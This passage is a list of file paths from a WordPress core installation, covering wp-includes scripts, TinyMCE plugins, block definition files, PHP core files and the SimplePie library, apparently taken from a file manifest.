    "wp-includes/js/jquery/ui/droppable.min.js",
    "wp-includes/js/jquery/ui/effect-blind.js",
    "wp-includes/js/jquery/ui/effect.js",
    "wp-includes/js/jquery/ui/effect-puff.min.js",
    "wp-includes/js/jquery/ui/resizable.min.js",
    "wp-includes/js/jquery/ui/selectmenu.js",
    "wp-includes/js/jquery/ui/effect-drop.min.js",
    "wp-includes/js/jquery/ui/effect-shake.min.js",
    "wp-includes/js/jquery/ui/core.min.js",
    "wp-includes/js/jquery/ui/progressbar.js",
    "wp-includes/js/jquery/ui/effect-slide.min.js",
    "wp-includes/js/jquery/ui/effect-fade.min.js",
    "wp-includes/js/jquery/ui/selectable.js",
    "wp-includes/js/jquery/ui/spinner.js",
    "wp-includes/js/jquery/ui/mouse.js",
    "wp-includes/js/jquery/ui/effect-clip.min.js",
    "wp-includes/js/jquery/ui/effect-scale.js",
    "wp-includes/js/jquery/ui/autocomplete.js",
    "wp-includes/js/jquery/ui/datepicker.min.js",
    "wp-includes/js/jquery/ui/droppable.js",
    "wp-includes/js/jquery/ui/tabs.js",
    "wp-includes/js/jquery/ui/effect-blind.min.js",
    "wp-includes/js/jquery/ui/draggable.js",
    "wp-includes/js/jquery/ui/effect-scale.min.js",
    "wp-includes/js/jquery/ui/effect-size.js",
    "wp-includes/js/jquery/ui/slider.min.js",
    "wp-includes/js/jquery/ui/effect-fold.js",
    "wp-includes/js/jquery/ui/controlgroup.js",
    "wp-includes/js/jquery/jquery.hotkeys.min.js",
    "wp-includes/js/jquery/suggest.min.js",
    "wp-includes/js/jquery/jquery.serialize-object.js",
    "wp-includes/js/jquery/suggest.js",
    "wp-includes/js/jquery/jquery.js",
    "wp-includes/js/jquery/jquery.masonry.min.js",
    "wp-includes/js/jquery/jquery.query.js",
    "wp-includes/js/jquery/jquery.schedule.js",
    "wp-includes/js/jquery/jquery.form.min.js",
    "wp-includes/js/jquery/jquery-migrate.js",
    "wp-includes/js/jquery/jquery.ui.touch-punch.js",
    "wp-includes/js/jquery/jquery.table-hotkeys.min.js",
    "wp-includes/js/jquery/jquery.min.js",
    "wp-includes/js/jquery/jquery.table-hotkeys.js",
    "wp-includes/js/jquery/jquery-migrate.min.js",
    "wp-includes/js/jquery/jquery.form.js",
    "wp-includes/js/jquery/jquery.color.min.js",
    "wp-includes/js/jquery/jquery.hotkeys.js",
    "wp-includes/js/colorpicker.js",
    "wp-includes/js/customize-preview-widgets.js",
    "wp-includes/js/wp-embed.js",
    "wp-includes/js/wp-custom-header.min.js",
    "wp-includes/js/imgareaselect/jquery.imgareaselect.min.js",
    "wp-includes/js/imgareaselect/jquery.imgareaselect.js",
    "wp-includes/js/hoverIntent.js",
    "wp-includes/js/json2.min.js",
    "wp-includes/js/wp-backbone.min.js",
    "wp-includes/js/colorpicker.min.js",
    "wp-includes/js/customize-models.js",
    "wp-includes/js/media-audiovideo.min.js",
    "wp-includes/js/tw-sack.js",
    "wp-includes/js/dist/editor.js",
    "wp-includes/js/dist/customize-widgets.js",
    "wp-includes/js/dist/core-commands.min.js",
    "wp-includes/js/dist/shortcode.min.js",
    "wp-includes/js/dist/components.min.js",
    "wp-includes/js/dist/patterns.js",
    "wp-includes/js/dist/patterns.min.js",
    "wp-includes/js/dist/redux-routine.min.js",
    "wp-includes/js/dist/hooks.min.js",
    "wp-includes/js/dist/edit-widgets.js",
    "wp-includes/js/dist/rich-text.js",
    "wp-includes/js/dist/vendor/react-jsx-runtime.js",
    "wp-includes/js/dist/vendor/wp-polyfill-dom-rect.js",
    "wp-includes/js/dist/vendor/moment.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill-object-fit.js",
    "wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js",
    "wp-includes/js/dist/vendor/lodash.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill-formdata.js",
    "wp-includes/js/dist/vendor/wp-polyfill-url.min.js",
    "wp-includes/js/dist/vendor/moment.js",
    "wp-includes/js/dist/vendor/wp-polyfill.js",
    "wp-includes/js/dist/vendor/wp-polyfill-url.js",
    "wp-includes/js/dist/vendor/react.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill-inert.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill-inert.js",
    "wp-includes/js/dist/vendor/react-dom.js",
    "wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js",
    "wp-includes/js/dist/vendor/regenerator-runtime.js",
    "wp-includes/js/dist/vendor/react-dom.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill-element-closest.js",
    "wp-includes/js/dist/vendor/wp-polyfill-fetch.js",
    "wp-includes/js/dist/vendor/lodash.js",
    "wp-includes/js/dist/vendor/wp-polyfill-node-contains.js",
    "wp-includes/js/dist/vendor/wp-polyfill-object-fit.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js",
    "wp-includes/js/dist/vendor/react-jsx-runtime.min.js.LICENSE.txt",
    "wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js",
    "wp-includes/js/dist/vendor/wp-polyfill.min.js",
    "wp-includes/js/dist/vendor/react.js",
    "wp-includes/js/dist/vendor/regenerator-runtime.min.js",
    "wp-includes/js/dist/vendor/react-jsx-runtime.min.js",
    "wp-includes/js/dist/deprecated.min.js",
    "wp-includes/js/dist/i18n.js",
    "wp-includes/js/dist/url.min.js",
    "wp-includes/js/dist/keyboard-shortcuts.js",
    "wp-includes/js/dist/element.js",
    "wp-includes/js/dist/core-commands.js",
    "wp-includes/js/dist/private-apis.min.js",
    "wp-includes/js/dist/edit-post.js",
    "wp-includes/js/dist/block-library.min.js",
    "wp-includes/js/dist/viewport.min.js",
    "wp-includes/js/dist/html-entities.js",
    "wp-includes/js/dist/shortcode.js",
    "wp-includes/js/dist/widgets.js",
    "wp-includes/js/dist/customize-widgets.min.js",
    "wp-includes/js/dist/keycodes.min.js",
    "wp-includes/js/dist/preferences-persistence.min.js",
    "wp-includes/js/dist/core-data.js",
    "wp-includes/js/dist/development/react-refresh-entry.js",
    "wp-includes/js/dist/development/react-refresh-runtime.min.js",
    "wp-includes/js/dist/development/react-refresh-runtime.js",
    "wp-includes/js/dist/development/react-refresh-entry.min.js",
    "wp-includes/js/dist/router.min.js",
    "wp-includes/js/dist/is-shallow-equal.min.js",
    "wp-includes/js/dist/style-engine.min.js",
    "wp-includes/js/dist/hooks.js",
    "wp-includes/js/dist/keycodes.js",
    "wp-includes/js/dist/compose.js",
    "wp-includes/js/dist/html-entities.min.js",
    "wp-includes/js/dist/reusable-blocks.min.js",
    "wp-includes/js/dist/annotations.js",
    "wp-includes/js/dist/data-controls.js",
    "wp-includes/js/dist/reusable-blocks.js",
    "wp-includes/js/dist/core-data.min.js",
    "wp-includes/js/dist/data.min.js",
    "wp-includes/js/dist/dom.js",
    "wp-includes/js/dist/warning.min.js",
    "wp-includes/js/dist/style-engine.js",
    "wp-includes/js/dist/nux.min.js",
    "wp-includes/js/dist/priority-queue.min.js",
    "wp-includes/js/dist/preferences-persistence.js",
    "wp-includes/js/dist/url.js",
    "wp-includes/js/dist/edit-site.min.js",
    "wp-includes/js/dist/dom-ready.js",
    "wp-includes/js/dist/block-serialization-default-parser.js",
    "wp-includes/js/dist/data.js",
    "wp-includes/js/dist/dom.min.js",
    "wp-includes/js/dist/priority-queue.js",
    "wp-includes/js/dist/script-modules/interactivity-router/index.min.js",
    "wp-includes/js/dist/script-modules/interactivity-router/index.js",
    "wp-includes/js/dist/script-modules/interactivity/index.min.js",
    "wp-includes/js/dist/script-modules/interactivity/debug.min.js",
    "wp-includes/js/dist/script-modules/interactivity/debug.js",
    "wp-includes/js/dist/script-modules/interactivity/index.js",
    "wp-includes/js/dist/script-modules/block-library/query/view.js",
    "wp-includes/js/dist/script-modules/block-library/query/view.min.js",
    "wp-includes/js/dist/script-modules/block-library/search/view.js",
    "wp-includes/js/dist/script-modules/block-library/search/view.min.js",
    "wp-includes/js/dist/script-modules/block-library/file/view.js",
    "wp-includes/js/dist/script-modules/block-library/file/view.min.js",
    "wp-includes/js/dist/script-modules/block-library/image/view.js",
    "wp-includes/js/dist/script-modules/block-library/image/view.min.js",
    "wp-includes/js/dist/script-modules/block-library/navigation/view.js",
    "wp-includes/js/dist/script-modules/block-library/navigation/view.min.js",
    "wp-includes/js/dist/script-modules/block-library/form/view.js",
    "wp-includes/js/dist/script-modules/block-library/form/view.min.js",
    "wp-includes/js/dist/script-modules/a11y/index.min.js",
    "wp-includes/js/dist/script-modules/a11y/index.js",
    "wp-includes/js/dist/blob.js",
    "wp-includes/js/dist/api-fetch.min.js",
    "wp-includes/js/dist/viewport.js",
    "wp-includes/js/dist/components.js",
    "wp-includes/js/dist/deprecated.js",
    "wp-includes/js/dist/private-apis.js",
    "wp-includes/js/dist/autop.min.js",
    "wp-includes/js/dist/wordcount.js",
    "wp-includes/js/dist/format-library.min.js",
    "wp-includes/js/dist/dom-ready.min.js",
    "wp-includes/js/dist/edit-widgets.min.js",
    "wp-includes/js/dist/commands.js",
    "wp-includes/js/dist/data-controls.min.js",
    "wp-includes/js/dist/format-library.js",
    "wp-includes/js/dist/block-serialization-default-parser.min.js",
    "wp-includes/js/dist/wordcount.min.js",
    "wp-includes/js/dist/plugins.min.js",
    "wp-includes/js/dist/keyboard-shortcuts.min.js",
    "wp-includes/js/dist/edit-site.js",
    "wp-includes/js/dist/i18n.min.js",
    "wp-includes/js/dist/rich-text.min.js",
    "wp-includes/js/dist/preferences.min.js",
    "wp-includes/js/dist/block-library.js",
    "wp-includes/js/dist/a11y.js",
    "wp-includes/js/dist/list-reusable-blocks.min.js",
    "wp-includes/js/dist/date.js",
    "wp-includes/js/dist/edit-post.min.js",
    "wp-includes/js/dist/escape-html.js",
    "wp-includes/js/dist/editor.min.js",
    "wp-includes/js/dist/token-list.js",
    "wp-includes/js/dist/router.js",
    "wp-includes/js/dist/plugins.js",
    "wp-includes/js/dist/commands.min.js",
    "wp-includes/js/dist/media-utils.min.js",
    "wp-includes/js/dist/a11y.min.js",
    "wp-includes/js/dist/server-side-render.min.js",
    "wp-includes/js/dist/primitives.js",
    "wp-includes/js/dist/block-editor.min.js",
    "wp-includes/js/dist/autop.js",
    "wp-includes/js/dist/compose.min.js",
    "wp-includes/js/dist/block-directory.js",
    "wp-includes/js/dist/annotations.min.js",
    "wp-includes/js/dist/block-editor.js",
    "wp-includes/js/dist/redux-routine.js",
    "wp-includes/js/dist/list-reusable-blocks.js",
    "wp-includes/js/dist/warning.js",
    "wp-includes/js/dist/is-shallow-equal.js",
    "wp-includes/js/dist/notices.min.js",
    "wp-includes/js/dist/blocks.js",
    "wp-includes/js/dist/notices.js",
    "wp-includes/js/dist/date.min.js",
    "wp-includes/js/dist/block-directory.min.js",
    "wp-includes/js/dist/blocks.min.js",
    "wp-includes/js/dist/server-side-render.js",
    "wp-includes/js/dist/preferences.js",
    "wp-includes/js/dist/nux.js",
    "wp-includes/js/dist/blob.min.js",
    "wp-includes/js/dist/media-utils.js",
    "wp-includes/js/dist/escape-html.min.js",
    "wp-includes/js/dist/widgets.min.js",
    "wp-includes/js/dist/token-list.min.js",
    "wp-includes/js/dist/primitives.min.js",
    "wp-includes/js/dist/api-fetch.js",
    "wp-includes/js/dist/element.min.js",
    "wp-includes/js/tinymce/themes/inlite/theme.min.js",
    "wp-includes/js/tinymce/themes/inlite/theme.js",
    "wp-includes/js/tinymce/themes/modern/theme.min.js",
    "wp-includes/js/tinymce/themes/modern/theme.js",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.eot",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.ttf",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.eot",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.woff",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.svg",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.svg",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce-small.woff",
    "wp-includes/js/tinymce/skins/lightgray/fonts/tinymce.ttf",
    "wp-includes/js/tinymce/skins/wordpress/images/script.svg",
    "wp-includes/js/tinymce/skins/wordpress/images/style.svg",
    "wp-includes/js/tinymce/tiny_mce_popup.js",
    "wp-includes/js/tinymce/wp-tinymce.js",
    "wp-includes/js/tinymce/wp-tinymce.php",
    "wp-includes/js/tinymce/license.txt",
    "wp-includes/js/tinymce/langs/wp-langs-en.js",
    "wp-includes/js/tinymce/utils/validate.js",
    "wp-includes/js/tinymce/utils/form_utils.js",
    "wp-includes/js/tinymce/utils/mctabs.js",
    "wp-includes/js/tinymce/utils/editable_selects.js",
    "wp-includes/js/tinymce/plugins/textcolor/plugin.min.js",
    "wp-includes/js/tinymce/plugins/textcolor/plugin.js",
    "wp-includes/js/tinymce/plugins/directionality/plugin.min.js",
    "wp-includes/js/tinymce/plugins/directionality/plugin.js",
    "wp-includes/js/tinymce/plugins/wpautoresize/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wpautoresize/plugin.js",
    "wp-includes/js/tinymce/plugins/wpeditimage/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wpeditimage/plugin.js",
    "wp-includes/js/tinymce/plugins/colorpicker/plugin.min.js",
    "wp-includes/js/tinymce/plugins/colorpicker/plugin.js",
    "wp-includes/js/tinymce/plugins/wptextpattern/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wptextpattern/plugin.js",
    "wp-includes/js/tinymce/plugins/hr/plugin.min.js",
    "wp-includes/js/tinymce/plugins/hr/plugin.js",
    "wp-includes/js/tinymce/plugins/wplink/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wplink/plugin.js",
    "wp-includes/js/tinymce/plugins/image/plugin.min.js",
    "wp-includes/js/tinymce/plugins/image/plugin.js",
    "wp-includes/js/tinymce/plugins/wpview/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wpview/plugin.js",
    "wp-includes/js/tinymce/plugins/wpgallery/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wpgallery/plugin.js",
    "wp-includes/js/tinymce/plugins/media/plugin.min.js",
    "wp-includes/js/tinymce/plugins/media/plugin.js",
    "wp-includes/js/tinymce/plugins/compat3x/plugin.min.js",
    "wp-includes/js/tinymce/plugins/compat3x/plugin.js",
    "wp-includes/js/tinymce/plugins/charmap/plugin.min.js",
    "wp-includes/js/tinymce/plugins/charmap/plugin.js",
    "wp-includes/js/tinymce/plugins/wpdialogs/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wpdialogs/plugin.js",
    "wp-includes/js/tinymce/plugins/link/plugin.min.js",
    "wp-includes/js/tinymce/plugins/link/plugin.js",
    "wp-includes/js/tinymce/plugins/tabfocus/plugin.min.js",
    "wp-includes/js/tinymce/plugins/tabfocus/plugin.js",
    "wp-includes/js/tinymce/plugins/wordpress/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wordpress/plugin.js",
    "wp-includes/js/tinymce/plugins/fullscreen/plugin.min.js",
    "wp-includes/js/tinymce/plugins/fullscreen/plugin.js",
    "wp-includes/js/tinymce/plugins/wpemoji/plugin.min.js",
    "wp-includes/js/tinymce/plugins/wpemoji/plugin.js",
    "wp-includes/js/tinymce/plugins/paste/plugin.min.js",
    "wp-includes/js/tinymce/plugins/paste/plugin.js",
    "wp-includes/js/tinymce/plugins/lists/plugin.min.js",
    "wp-includes/js/tinymce/plugins/lists/plugin.js",
    "wp-includes/js/tinymce/tinymce.min.js",
    "wp-includes/js/wp-auth-check.js",
    "wp-includes/js/wp-emoji-release.min.js",
    "wp-includes/js/zxcvbn-async.js",
    "wp-includes/js/crop/cropper.js",
    "wp-includes/js/wp-emoji.min.js",
    "wp-includes/js/customize-loader.js",
    "wp-includes/js/customize-preview-nav-menus.js",
    "wp-includes/js/customize-selective-refresh.min.js",
    "wp-includes/js/wp-lists.min.js",
    "wp-includes/js/swfobject.min.js",
    "wp-includes/js/media-audiovideo.js",
    "wp-includes/js/customize-preview.js",
    "wp-includes/js/utils.js",
    "wp-includes/js/wp-list-revisions.min.js",
    "wp-includes/js/customize-preview.min.js",
    "wp-includes/js/wp-ajax-response.min.js",
    "wp-includes/js/backbone.js",
    "wp-includes/js/tw-sack.min.js",
    "wp-includes/js/wplink.min.js",
    "wp-includes/js/wp-embed-template.min.js",
    "wp-includes/js/wp-emoji-loader.min.js",
    "wp-includes/js/wp-emoji-loader.js",
    "wp-includes/js/wp-lists.js",
    "wp-includes/js/admin-bar.min.js",
    "wp-includes/option.php",
    "wp-includes/class-wp-scripts.php",
    "wp-includes/https-detection.php",
    "wp-includes/class-wp-editor.php",
    "wp-includes/pomo/entry.php",
    "wp-includes/pomo/translations.php",
    "wp-includes/pomo/mo.php",
    "wp-includes/pomo/po.php",
    "wp-includes/pomo/streams.php",
    "wp-includes/pomo/plural-forms.php",
    "wp-includes/cache.php",
    "wp-includes/class-wp-locale.php",
    "wp-includes/widgets.php",
    "wp-includes/session.php",
    "wp-includes/bookmark-template.php",
    "wp-includes/block-i18n.json",
    "wp-includes/blocks/query-pagination.php",
    "wp-includes/blocks/comments-pagination-numbers/block.json",
    "wp-includes/blocks/widget-group.php",
    "wp-includes/blocks/column/block.json",
    "wp-includes/blocks/heading/block.json",
    "wp-includes/blocks/query-title/block.json",
    "wp-includes/blocks/comments.php",
    "wp-includes/blocks/home-link.php",
    "wp-includes/blocks/pattern/block.json",
    "wp-includes/blocks/avatar/block.json",
    "wp-includes/blocks/missing/block.json",
    "wp-includes/blocks/buttons/block.json",
    "wp-includes/blocks/cover/block.json",
    "wp-includes/blocks/latest-comments/block.json",
    "wp-includes/blocks/read-more.php",
    "wp-includes/blocks/comments-pagination-next/block.json",
    "wp-includes/blocks/query-pagination-numbers.php",
    "wp-includes/blocks/social-links/block.json",
    "wp-includes/blocks/freeform/block.json",
    "wp-includes/blocks/site-tagline.php",
    "wp-includes/blocks/template-part/block.json",
    "wp-includes/blocks/post-terms.php",
    "wp-includes/blocks/pullquote/block.json",
    "wp-includes/blocks/heading.php",
    "wp-includes/blocks/block/block.json",
    "wp-includes/blocks/comment-author-name/block.json",
    "wp-includes/blocks/media-text/block.json",
    "wp-includes/blocks/social-link.php",
    "wp-includes/blocks/video/block.json",
    "wp-includes/blocks/post-date/block.json",
    "wp-includes/blocks/details/block.json",
    "wp-includes/blocks/post-author-biography/block.json",
    "wp-includes/blocks/post-terms/block.json",
    "wp-includes/blocks/columns/block.json",
    "wp-includes/blocks/query/block.json",
    "wp-includes/blocks/query/view.asset.php",
    "wp-includes/blocks/query/view.js",
    "wp-includes/blocks/query/view.min.js",
    "wp-includes/blocks/query/view.min.asset.php",
    "wp-includes/blocks/comments-pagination-numbers.php",
    "wp-includes/blocks/archives/block.json",
    "wp-includes/blocks/comment-template/block.json",
    "wp-includes/blocks/search/block.json",
    "wp-includes/blocks/search/view.asset.php",
    "wp-includes/blocks/search/view.js",
    "wp-includes/blocks/search/view.min.js",
    "wp-includes/blocks/search/view.min.asset.php",
    "wp-includes/blocks/group/block.json",
    "wp-includes/blocks/code/block.json",
    "wp-includes/blocks/comment-template.php",
    "wp-includes/blocks/require-static-blocks.php",
    "wp-includes/blocks/paragraph/block.json",
    "wp-includes/blocks/query-title.php",
    "wp-includes/blocks/calendar.php",
    "wp-includes/blocks/site-logo/block.json",
    "wp-includes/blocks/preformatted/block.json",
    "wp-includes/blocks/page-list-item/block.json",
    "wp-includes/blocks/template-part.php",
    "wp-includes/blocks/text-columns/block.json",
    "wp-includes/blocks/comments-pagination-previous/block.json",
    "wp-includes/blocks/tag-cloud/block.json",
    "wp-includes/blocks/navigation.php",
    "wp-includes/blocks/file/block.json",
    "wp-includes/blocks/file/view.asset.php",
    "wp-includes/blocks/file/view.js",
    "wp-includes/blocks/file/view.min.js",
    "wp-includes/blocks/file/view.min.asset.php",
    "wp-includes/blocks/legacy-widget/block.json",
    "wp-includes/blocks/table/block.json",
    "wp-includes/blocks/image/block.json",
    "wp-includes/blocks/image/view.asset.php",
    "wp-includes/blocks/image/view.js",
    "wp-includes/blocks/image/view.min.js",
    "wp-includes/blocks/image/view.min.asset.php",
    "wp-includes/blocks/loginout/block.json",
    "wp-includes/blocks/navigation-submenu.php",
    "wp-includes/blocks/post-content/block.json",
    "wp-includes/blocks/comment-edit-link.php",
    "wp-includes/blocks/html/block.json",
    "wp-includes/blocks/post-excerpt.php",
    "wp-includes/blocks/pattern.php",
    "wp-includes/blocks/post-date.php",
    "wp-includes/blocks/page-list.php",
    "wp-includes/blocks/query.php",
    "wp-includes/blocks/navigation-link/block.json",
    "wp-includes/blocks/page-list/block.json",
    "wp-includes/blocks/post-author-name.php",
    "wp-includes/blocks/loginout.php",
    "wp-includes/blocks/post-title.php",
    "wp-includes/blocks/media-text.php",
    "wp-includes/blocks/post-title/block.json",
    "wp-includes/blocks/more/block.json",
    "wp-includes/blocks/button/block.json",
    "wp-includes/blocks/comment-reply-link.php",
    "wp-includes/blocks/tag-cloud.php",
    "wp-includes/blocks/site-logo.php",
    "wp-includes/blocks/gallery/block.json",
    "wp-includes/blocks/comments-pagination-previous.php",
    "wp-includes/blocks/audio/block.json",
    "wp-includes/blocks/list-item/block.json",
    "wp-includes/blocks/post-comments-form/block.json",
    "wp-includes/blocks/navigation/view-modal.asset.php",
    "wp-includes/blocks/navigation/block.json",
    "wp-includes/blocks/navigation/view.asset.php",
    "wp-includes/blocks/navigation/view.js",
    "wp-includes/blocks/navigation/view.min.js",
    "wp-includes/blocks/navigation/view.min.asset.php",
    "wp-includes/blocks/navigation/view-modal.min.asset.php",
    "wp-includes/blocks/post-comments-form.php",
    "wp-includes/blocks/require-dynamic-blocks.php",
    "wp-includes/blocks/read-more/block.json",
    "wp-includes/blocks/post-author/block.json",
    "wp-includes/blocks/comments-title.php",
    "wp-includes/blocks/comments/block.json",
    "wp-includes/blocks/list/block.json",
    "wp-includes/blocks/query-pagination-numbers/block.json",
    "wp-includes/blocks/latest-posts.php",
    "wp-includes/blocks/categories.php",
    "wp-includes/blocks/post-featured-image/block.json",
    "wp-includes/blocks/site-title.php",
    "wp-includes/blocks/archives.php",
    "wp-includes/blocks/query-total.php",
    "wp-includes/blocks/navigation-submenu/block.json",
    "wp-includes/blocks/query-pagination-next/block.json",
    "wp-includes/blocks/post-navigation-link.php",
    "wp-includes/blocks/categories/block.json",
    "wp-includes/blocks/footnotes/block.json",
    "wp-includes/blocks/post-excerpt/block.json",
    "wp-includes/blocks/page-list-item.php",
    "wp-includes/blocks/query-total/block.json",
    "wp-includes/blocks/legacy-widget.php",
    "wp-includes/blocks/block.php",
    "wp-includes/blocks/query-pagination-next.php",
    "wp-includes/blocks/comment-date/block.json",
    "wp-includes/blocks/embed/block.json",
    "wp-includes/blocks/quote/block.json",
    "wp-includes/blocks/post-featured-image.php",
    "wp-includes/blocks/query-pagination/block.json",
    "wp-includes/blocks/comment-date.php",
    "wp-includes/blocks/latest-posts/block.json",
    "wp-includes/blocks/term-description/block.json",
    "wp-includes/blocks/nextpage/block.json",
    "wp-includes/blocks/post-navigation-link/block.json",
    "wp-includes/blocks/post-author-biography.php",
    "wp-includes/blocks/shortcode/block.json",
    "wp-includes/blocks/file.php",
    "wp-includes/blocks/post-content.php",
    "wp-includes/blocks/rss/block.json",
    "wp-includes/blocks/query-no-results.php",
    "wp-includes/blocks/separator/block.json",
    "wp-includes/blocks/search.php",
    "wp-includes/blocks/navigation-link.php",
    "wp-includes/blocks/avatar.php",
    "wp-includes/blocks/comments-pagination/block.json",
    "wp-includes/blocks/site-title/block.json",
    "wp-includes/blocks/comment-reply-link/block.json",
    "wp-includes/blocks/social-link/block.json",
    "wp-includes/blocks/verse/block.json",
    "wp-includes/blocks/rss.php",
    "wp-includes/blocks/footnotes.php",
    "wp-includes/blocks/comments-pagination.php",
    "wp-includes/blocks/post-template/block.json",
    "wp-includes/blocks/shortcode.php",
    "wp-includes/blocks/comment-content/block.json",
    "wp-includes/blocks/comments-title/block.json",
    "wp-includes/blocks/comments-pagination-next.php",
    "wp-includes/blocks/home-link/block.json",
    "wp-includes/blocks/index.php",
    "wp-includes/blocks/button.php",
    "wp-includes/blocks/query-pagination-previous/block.json",
    "wp-includes/blocks/calendar/block.json",
    "wp-includes/blocks/latest-comments.php",
    "wp-includes/blocks/query-pagination-previous.php",
    "wp-includes/blocks/image.php",
    "wp-includes/blocks/blocks-json.php",
    "wp-includes/blocks/widget-group/block.json",
    "wp-includes/blocks/cover.php",
    "wp-includes/blocks/list.php",
    "wp-includes/blocks/term-description.php",
    "wp-includes/blocks/post-template.php",
    "wp-includes/blocks/site-tagline/block.json",
    "wp-includes/blocks/comment-edit-link/block.json",
    "wp-includes/blocks/spacer/block.json",
    "wp-includes/blocks/gallery.php",
    "wp-includes/blocks/query-no-results/block.json",
    "wp-includes/blocks/post-author.php",
    "wp-includes/blocks/post-author-name/block.json",
    "wp-includes/blocks/comment-content.php",
    "wp-includes/blocks/comment-author-name.php",
    "wp-includes/version.php",
    "wp-includes/class-wp-http-requests-response.php",
    "wp-includes/class-wp-block-styles-registry.php",
    "wp-includes/cache-compat.php",
    "wp-includes/class-wp-block-parser.php",
    "wp-includes/class-wp-exception.php",
    "wp-includes/class-walker-page.php",
    "wp-includes/general-template.php",
    "wp-includes/ms-default-constants.php",
    "wp-includes/class-wp-theme-json.php",
    "wp-includes/class-wp-comment-query.php",
    "wp-includes/block-supports/settings.php",
    "wp-includes/block-supports/border.php",
    "wp-includes/block-supports/typography.php",
    "wp-includes/block-supports/utils.php",
    "wp-includes/block-supports/dimensions.php",
    "wp-includes/block-supports/generated-classname.php",
    "wp-includes/block-supports/align.php",
    "wp-includes/block-supports/background.php",
    "wp-includes/block-supports/custom-classname.php",
    "wp-includes/block-supports/colors.php",
    "wp-includes/block-supports/elements.php",
    "wp-includes/block-supports/aria-label.php",
    "wp-includes/block-supports/position.php",
    "wp-includes/block-supports/spacing.php",
    "wp-includes/block-supports/layout.php",
    "wp-includes/block-supports/shadow.php",
    "wp-includes/block-supports/duotone.php",
    "wp-includes/block-supports/block-style-variations.php",
    "wp-includes/pluggable-deprecated.php",
    "wp-includes/ms-blogs.php",
    "wp-includes/class-IXR.php",
    "wp-includes/media.php",
    "wp-includes/theme-templates.php",
    "wp-includes/class-wpdb.php",
    "wp-includes/class-wp-http-ixr-client.php",
    "wp-includes/class-wp-matchesmapregex.php",
    "wp-includes/class-wp-admin-bar.php",
    "wp-includes/ms-load.php",
    "wp-includes/link-template.php",
    "wp-includes/class-wp-rewrite.php",
    "wp-includes/SimplePie/src/RegistryAware.php",
    "wp-includes/SimplePie/src/Author.php",
    "wp-includes/SimplePie/src/Gzdecode.php",
    "wp-includes/SimplePie/src/Source.php",
    "wp-includes/SimplePie/src/Net/IPv6.php",
    "wp-includes/SimplePie/src/Category.php",
    "wp-includes/SimplePie/src/Content/Type/Sniffer.php",
    "wp-includes/SimplePie/src/Cache/Psr16.php",
    "wp-includes/SimplePie/src/Cache/Base.php",
    "wp-includes/SimplePie/src/Cache/BaseDataCache.php",
    "wp-includes/SimplePie/src/Cache/DB.php",
    "wp-includes/SimplePie/src/Cache/File.php",
    "wp-includes/SimplePie/src/Cache/Redis.php",
    "wp-includes/SimplePie/src/Cache/Memcache.php",
    "wp-includes/SimplePie/src/Cache/DataCache.php",
    "wp-includes/SimplePie/src/Cache/Memcached.php",
    "wp-includes/SimplePie/src/Cache/MySQL.php",
    "wp-includes/SimplePie/src/Cache/NameFilter.php",
    "wp-includes/SimplePie/src/Cache/CallableNameFilter.php",
    "wp-includes/SimplePie/src/Registry.php",
    "wp-includes/SimplePie/src/Parser.php",
    "wp-includes/SimplePie/src/HTTP/Parser.php",
    "wp-includes/SimplePie/src/Item.php",
    "wp-includes/SimplePie/src/Locator.php",
    "wp-includes/SimplePie/src/SimplePie.php",
    "wp-includes/SimplePie/src/Rating.php",
    "wp-includes/SimplePie/src/Copyright.php",
    "wp-includes/SimplePie/src/Credit.php",
    "wp-includes/SimplePie/src/Caption.php",
    "wp-includes/SimplePie/src/File.php",
    "wp-includes/SimplePie/src/Enclosure.php",
    "wp-includes/SimplePie/src/Parse/Date.php",
    "wp-includes/SimplePie/src/Decode/HTML/Entities.php",
    "wp-includes/SimplePie/src/XML/Declaration/Parser.php",
    "wp-includes/SimplePie/src/Exception.php",
    "wp-includes/SimplePie/src/Core.php",
    "wp-includes/SimplePie/src/Cache.php",
    "wp-includes/SimplePie/src/Restriction.php",
    "wp-includes/SimplePie/src/Sanitize.php",
    "wp-includes/SimplePie/src/IRI.php",
    "wp-includes/SimplePie/src/Misc.php",
    "wp-includes/SimplePie/library/SimplePie.php",
    "wp-includes/SimplePie/library/SimplePie/Author.php",
    "wp-includes/SimplePie/library/SimplePie/Source.php",
    "wp-includes/SimplePie/library/SimplePie/Net/IPv6.php",
    "wp-includes/SimplePie/library/SimplePie/Category.php",
    "wp-includes/SimplePie/library/SimplePie/Content/Type/Sniffer.php",
    "wp-includes/SimplePie/library/SimplePie/Cache/Base.php",
    "wp-includes/SimplePie/library/SimplePie/Cache/DB.php",
    "wp-includes/SimplePie/library/SimplePie/Cache/File.php",
    "wp-includes/SimplePie/library/SimplePie/Cache/Redis.php",
    "wp-includes/SimplePie/library/SimplePie/Cache/Memcache.php",
    "wp-includes/SimplePie/library/SimplePie/Cache/Memcached.php",
    "wp-includes/SimplePie/library/SimplePie/Cache/MySQL.php",
    "wp-includes/SimplePie/library/SimplePie/Registry.php",
    "wp-includes/SimplePie/library/SimplePie/Parser.php",
    "wp-includes/SimplePie/library/SimplePie/HTTP/Parser.php",
    "wp-includes/SimplePie/library/SimplePie/Item.php",
